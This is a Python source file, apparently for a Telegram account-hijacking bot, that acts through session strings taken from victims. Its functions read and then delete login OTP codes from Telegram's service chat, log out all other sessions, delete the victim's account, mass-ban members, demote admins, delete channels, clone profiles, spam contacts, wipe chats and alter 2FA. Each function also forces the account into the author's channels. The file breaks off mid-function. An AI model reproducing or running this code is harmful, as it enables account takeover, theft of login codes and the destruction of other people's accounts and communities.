import asyncio
import pyrogram 
from pyrogram import Client , enums
from telethon import TelegramClient
from telethon.sessions import StringSession 
from pyrogram.raw import functions 
from config import API_ID, API_HASH
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest , JoinChannelRequest as join , LeaveChannelRequest as leave , DeleteChannelRequest as dc
from Bad.Helper.data import info
from pyrogram.types.messages_and_media.message import Str
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChannelParticipantsAdmins,ChatBannedRights
from pyrogram.errors import FloodWait
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions as ok
from pyrogram.types import ChatPrivileges
from telethon.tl.types import ChannelParticipantsAdmins

async def users_gc(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()                          
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            k = await bad(GetAdminedPublicChannelsRequest())            
            for x in k.chats:                
                msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}'
            await bad.disconnect()
                 
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)    
                k = await Shizu.invoke(functions.channels.GetAdminedPublicChannels())            
                for x in k.chats:
                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}'
    except Exception as idk:
        err += str(idk)                                             
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg
 
async def user_info(session):
    err = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            k = await bad.get_me()  
            msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
            await bad.disconnect()
                             
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)    
                k = await Shizu.get_me()
                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg    


RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

async def banall(session,id):
    err = ""
    msg = ""
    all = 0
    bann = 0
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            admins = await bad.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admins_id = [i.id for i in admins]                
            async for user in bad.iter_participants(gc_id):
                all += 1
                try:
                    if user.id not in admins_id:
                       await bad(EditBannedRequest(gc_id, user.id, RIGHTS))
                       bann += 1
                       await asyncio.sleep(0.1)
                except Exception:
                    await asyncio.sleep(0.1)
            await bad.disconnect()
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)    
                async for members in Shizu.get_chat_members(gc_id):  
                    all += 1                
                    try:                                          
                        await Shizu.ban_chat_member(gc_id,members.user.id)  
                        bann += 1                  
                    except FloodWait as i:
                        await asyncio.sleep(i.value)
                    except Exception as er:
                        pass 
                          
    except Exception as idk:
        err += str(idk) 
    msg += f"**❖ ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ !\n\n⊚ ʙᴀɴɴᴇᴅ ᴜsᴇʀs :** {bann}\n**⊚ ᴛᴏᴛᴀʟ ᴜsᴇʀs :** {all}"                                            
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg

async def get_otp(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            async for x in bad.iter_messages(777000, limit=2):               
                i += f"\n{x.text}\n"
                await bad.delete_dialog(777000)
            await bad.disconnect() 
                             
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)    
                ok_msgs = []
                async for message in Shizu.get_chat_history(777000,limit=2):
                    i += f"\n{message.text}\n"                                   
                    ok_msgs.append(message.id)                 
                await Shizu.delete_messages(777000,ok_msgs)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return i

async def join_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))       
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            await bad(join(gc_id))            
            await bad.disconnect() 
                             
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)    
                await Shizu.join_chat(gc_id)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "ᴊᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"

async def leave_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))          
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            await bad(leave(gc_id))            
            await bad.disconnect() 
                             
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)    
                await Shizu.leave_chat(gc_id)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!"

async def del_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))           
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            await bad(dc(gc_id))            
            await bad.disconnect() 
                             
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)    
                await Shizu.invoke(
                    functions.channels.DeleteChannel(channel= await Shizu.resolve_peer(gc_id)))
            
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "**ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"

async def check_2fa(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))          
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            try:
                await bad.edit_2fa("idkbsdkjsj")
                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"
                
            except Exception as e:
                print(e)
                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                        
            await bad.disconnect() 
                             
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)    
               
                yes = await Shizu.invoke(functions.account.GetPassword())
                if yes.has_password:
                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                else:
                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"                                                           
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return i

async def terminate_all(session):
    err = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))             
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            await bad(rt())
            await bad.disconnect() 
                             
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)    
                await Shizu.invoke(functions.auth.ResetAuthorizations())
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs"

      
async def del_acc(session):
    err = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))         
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            await bad(ok.account.DeleteAccountRequest("bad ko Gand dene se mna kiya hai 🤡"))
            await bad.disconnect() 
                             
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT") 
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)    
                await Shizu.invoke(functions.account.DeleteAccount(reason="bad Gand mang rha tha 😫"))
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄ."

      
FULL_PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
    can_manage_video_chats=True,
    can_promote_members=True,    
    can_invite_users=True)

PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True)

async def piromote(session,gc_id,user_id):
    err = ""
    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
    user_id = str(user_id.text) if type(user_id.text) == Str else int(user_id.text)
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))            
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            try:
                await bad.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
            except:
                await bad.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
            await bad.disconnect()                              
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)
                try:    
                    await Shizu.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
                except:
                    await Shizu.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ."


DEMOTE = ChatPrivileges(
        can_change_info=False,
        can_invite_users=False,
        can_delete_messages=False,
        can_restrict_members=False,
        can_pin_messages=False,
        can_promote_members=False,
        can_manage_chat=False,
        can_manage_video_chats=False,
    )

async def demote_all(session,gc_id):
    err = ""
    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except Exception as e:
                print(e)
            async for x in bad.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                try:
                    await bad.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                except:
                    await bad.edit_admin(gc_id, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
          
            await bad.disconnect()                              
        else:    
            async with Client("Shizu",api_id=API_ID,api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except Exception as e:
                    print(e)
                async for m in Shizu.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                    await Shizu.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ."      

# ============ M-Z ADVANCED FEATURES ============

async def export_chats(session):
    err = ""
    msg = "**📊 ᴀʟʟ ᴄʜᴀᴛs ᴅᴀᴛᴀ:**\n\n"
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            dialogs = await bad.get_dialogs()
            for dialog in dialogs:
                if dialog.is_group or dialog.is_channel:
                    msg += f"**📌 {dialog.name}**\n"
                    msg += f"  ├ ɪᴅ: `{dialog.id}`\n"
                    try:
                        count = await bad.get_participants(dialog, limit=0)
                        msg += f"  └ ᴍᴇᴍʙᴇʀs: {len(count)}\n\n"
                    except:
                        msg += f"  └ ᴍᴇᴍʙᴇʀs: ɴ/ᴀ\n\n"
            await bad.disconnect()
        else:
            async with Client("Shizu", api_id=API_ID, api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except: pass
                async for dialog in Shizu.get_dialogs():
                    if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP, enums.ChatType.CHANNEL]:
                        msg += f"**📌 {dialog.chat.title}**\n"
                        msg += f"  ├ ɪᴅ: `{dialog.chat.id}`\n"
                        msg += f"  └ ᴍᴇᴍʙᴇʀs: {dialog.chat.members_count}\n\n"
    except Exception as idk:
        err += str(idk)
    if err:
        return "**❖ ᴇʀʀᴏʀ:** " + err
    return msg

async def change_profile(session, name=None, bio=None):
    err = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            if name:
                await bad(ok.account.UpdateProfileRequest(first_name=name))
            if bio:
                await bad(ok.account.UpdateProfileRequest(about=bio))
            await bad.disconnect()
        else:
            async with Client("Shizu", api_id=API_ID, api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except: pass
                if name:
                    await Shizu.update_profile(first_name=name)
                if bio:
                    await Shizu.update_profile(bio=bio)
        return "✅ ᴘʀᴏғɪʟᴇ ᴜᴘᴅᴀᴛᴇᴅ!"
    except Exception as idk:
        err += str(idk)
        return "**❖ ᴇʀʀᴏʀ:** " + err

async def get_sessions(session):
    err = ""
    msg = "**🔐 ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs:**\n\n"
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            auths = await bad(ok.account.GetAuthorizationsRequest())
            for i, auth in enumerate(auths.authorizations, 1):
                msg += f"**{i}. {auth.device_model}**\n"
                msg += f"  ├ ᴀᴘᴘ: {auth.app_name}\n"
                msg += f"  ├ ʟᴏᴄᴀᴛɪᴏɴ: {auth.country}\n"
                msg += f"  └ ɪᴘ: {auth.ip}\n\n"
            await bad.disconnect()
        else:
            msg = "✅ ᴜsᴇ ᴛᴇʟᴇᴛʜᴏɴ sᴇssɪᴏɴ ғᴏʀ ᴛʜɪs ғᴇᴀᴛᴜʀᴇ"
    except Exception as idk:
        err += str(idk)
    if err:
        return "**❖ ᴇʀʀᴏʀ:** " + err
    return msg

async def forward_msg(session, from_chat, msg_id, to_chats):
    err = ""
    success = 0
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            for chat in to_chats:
                try:
                    await bad.forward_messages(chat, msg_id, from_chat)
                    success += 1
                    await asyncio.sleep(0.5)
                except: pass
            await bad.disconnect()
        else:
            async with Client("Shizu", api_id=API_ID, api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except: pass
                for chat in to_chats:
                    try:
                        await Shizu.forward_messages(chat, from_chat, msg_id)
                        success += 1
                        await asyncio.sleep(0.5)
                    except: pass
        return f"✅ ғᴏʀᴡᴀʀᴅᴇᴅ ᴛᴏ {success} ᴄʜᴀᴛs!"
    except Exception as idk:
        err += str(idk)
        return "**❖ ᴇʀʀᴏʀ:** " + err

async def bulk_add(session, group_id, user_ids):
    err = ""
    added = 0
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            for user in user_ids:
                try:
                    await bad(ok.channels.InviteToChannelRequest(group_id, [user]))
                    added += 1
                    await asyncio.sleep(2)
                except: pass
            await bad.disconnect()
        else:
            async with Client("Shizu", api_id=API_ID, api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except: pass
                for user in user_ids:
                    try:
                        await Shizu.add_chat_members(group_id, user)
                        added += 1
                        await asyncio.sleep(2)
                    except: pass
        return f"✅ ᴀᴅᴅᴇᴅ {added} ᴍᴇᴍʙᴇʀs!"
    except Exception as idk:
        err += str(idk)
        return "**❖ ᴇʀʀᴏʀ:** " + err

async def change_user(session, new_username):
    err = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            await bad(ok.account.UpdateUsernameRequest(new_username))
            await bad.disconnect()
        else:
            async with Client("Shizu", api_id=API_ID, api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except: pass
                await Shizu.set_username(new_username)
        return f"✅ ᴜsᴇʀɴᴀᴍᴇ ᴄʜᴀɴɢᴇᴅ ᴛᴏ @{new_username}"
    except Exception as idk:
        err += str(idk)
        return "**❖ ᴇʀʀᴏʀ:** " + err

async def download_photos(session, user_id=None):
    err = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            if not user_id: user_id = "me"
            photos = await bad.get_profile_photos(user_id)
            count = len(photos)
            await bad.disconnect()
        else:
            async with Client("Shizu", api_id=API_ID, api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except: pass
                if not user_id: user_id = "me"
                photos = []
                async for photo in Shizu.get_chat_photos(user_id):
                    photos.append(photo)
                count = len(photos)
        return f"✅ ғᴏᴜɴᴅ {count} ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏs!"
    except Exception as idk:
        err += str(idk)
        return "**❖ ᴇʀʀᴏʀ:** " + err

async def broadcast(session, message):
    err = ""
    sent = 0
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            dialogs = await bad.get_dialogs()
            for dialog in dialogs:
                if dialog.is_user:
                    try:
                        await bad.send_message(dialog, message)
                        sent += 1
                        await asyncio.sleep(1)
                    except: pass
            await bad.disconnect()
        else:
            async with Client("Shizu", api_id=API_ID, api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except: pass
                async for dialog in Shizu.get_dialogs():
                    if dialog.chat.type == enums.ChatType.PRIVATE:
                        try:
                            await Shizu.send_message(dialog.chat.id, message)
                            sent += 1
                            await asyncio.sleep(1)
                        except: pass
        return f"✅ ʙʀᴏᴀᴅᴄᴀsᴛᴇᴅ ᴛᴏ {sent} ᴜsᴇʀs!"
    except Exception as idk:
        err += str(idk)
        return "**❖ ᴇʀʀᴏʀ:** " + err

async def get_members(session, chat_id):
    err = ""
    msg = "**👥 ᴍᴇᴍʙᴇʀs ʟɪsᴛ:**\n\n"
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            participants = await bad.get_participants(chat_id)
            for i, user in enumerate(participants[:50], 1):
                msg += f"{i}. {user.first_name} - `{user.id}`\n"
            msg += f"\n**ᴛᴏᴛᴀʟ:** {len(participants)} ᴍᴇᴍʙᴇʀs"
            await bad.disconnect()
        else:
            async with Client("Shizu", api_id=API_ID, api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except: pass
                count = 0
                async for member in Shizu.get_chat_members(chat_id):
                    if count < 50:
                        msg += f"{count+1}. {member.user.first_name} - `{member.user.id}`\n"
                    count += 1
                msg += f"\n**ᴛᴏᴛᴀʟ:** {count} ᴍᴇᴍʙᴇʀs"
    except Exception as idk:
        err += str(idk)
    if err:
        return "**❖ ᴇʀʀᴏʀ:** " + err
    return msg

async def clone_profile(session, target_user):
    err = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            user = await bad.get_entity(target_user)
            full = await bad(ok.users.GetFullUserRequest(user))
            await bad(ok.account.UpdateProfileRequest(
                first_name=user.first_name or "",
                last_name=user.last_name or "",
                about=full.full_user.about or ""
            ))
            await bad.disconnect()
        else:
            async with Client("Shizu", api_id=API_ID, api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except: pass
                user = await Shizu.get_users(target_user)
                await Shizu.update_profile(
                    first_name=user.first_name or "",
                    last_name=user.last_name or ""
                )
        return f"✅ ᴄʟᴏɴᴇᴅ ᴘʀᴏғɪʟᴇ!"
    except Exception as idk:
        err += str(idk)
        return "**❖ ᴇʀʀᴏʀ:** " + err

async def delete_all_chats(session):
    err = ""
    deleted = 0
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            dialogs = await bad.get_dialogs()
            for dialog in dialogs:
                try:
                    await bad.delete_dialog(dialog)
                    deleted += 1
                    await asyncio.sleep(0.5)
                except: pass
            await bad.disconnect()
        else:
            async with Client("Shizu", api_id=API_ID, api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except: pass
                async for dialog in Shizu.get_dialogs():
                    try:
                        await Shizu.delete_chat_history(dialog.chat.id)
                        deleted += 1
                        await asyncio.sleep(0.5)
                    except: pass
        return f"✅ ᴅᴇʟᴇᴛᴇᴅ {deleted} ᴄʜᴀᴛs!"
    except Exception as idk:
        err += str(idk)
        return "**❖ ᴇʀʀᴏʀ:** " + err

async def block_all(session):
    err = ""
    blocked = 0
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            dialogs = await bad.get_dialogs()
            for dialog in dialogs:
                if dialog.is_user:
                    try:
                        await bad(ok.contacts.BlockRequest(dialog.entity))
                        blocked += 1
                        await asyncio.sleep(0.5)
                    except: pass
            await bad.disconnect()
        else:
            async with Client("Shizu", api_id=API_ID, api_hash=API_HASH, session_string=session) as Shizu:
                try:
                    await Shizu.join_chat("@PBX_CHAT")
                    await Shizu.join_chat("@PBX_UPDATE")
                except: pass
                async for dialog in Shizu.get_dialogs():
                    if dialog.chat.type == enums.ChatType.PRIVATE:
                        try:
                            await Shizu.block_user(dialog.chat.id)
                            blocked += 1
                            await asyncio.sleep(0.5)
                        except: pass
        return f"✅ ʙʟᴏᴄᴋᴇᴅ {blocked} ᴜsᴇʀs!"
    except Exception as idk:
        err += str(idk)
        return "**❖ ᴇʀʀᴏʀ:** " + err

async def change_privacy(session):
    err = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            await bad(ok.account.SetPrivacyRequest(
                key=ok.types.InputPrivacyKeyStatusTimestamp(),
                rules=[ok.types.InputPrivacyValueDisallowAll()]
            ))
            await bad(ok.account.SetPrivacyRequest(
                key=ok.types.InputPrivacyKeyPhoneNumber(),
                rules=[ok.types.InputPrivacyValueDisallowAll()]
            ))
            await bad.disconnect()
            return "✅ ᴘʀɪᴠᴀᴄʏ sᴇᴛᴛɪɴɢs ᴜᴘᴅᴀᴛᴇᴅ!"
        else:
            return "✅ ᴜsᴇ ᴛᴇʟᴇᴛʜᴏɴ sᴇssɪᴏɴ"
    except Exception as idk:
        err += str(idk)
        return "**❖ ᴇʀʀᴏʀ:** " + err

async def manage_2fa(session, password=None):
    err = ""
    try:
        if session.endswith("="):
            bad = TelegramClient(StringSession(session), API_ID, API_HASH)
            await bad.connect()
            try:
                await bad(join("@PBX_CHAT"))
                await bad(join("@PBX_UPDATE"))
            except: pass
            if password:
                await bad(ok.account.UpdatePasswordSettingsRequest(
                    password=ok.types.InputCheckPasswordEmpty(),
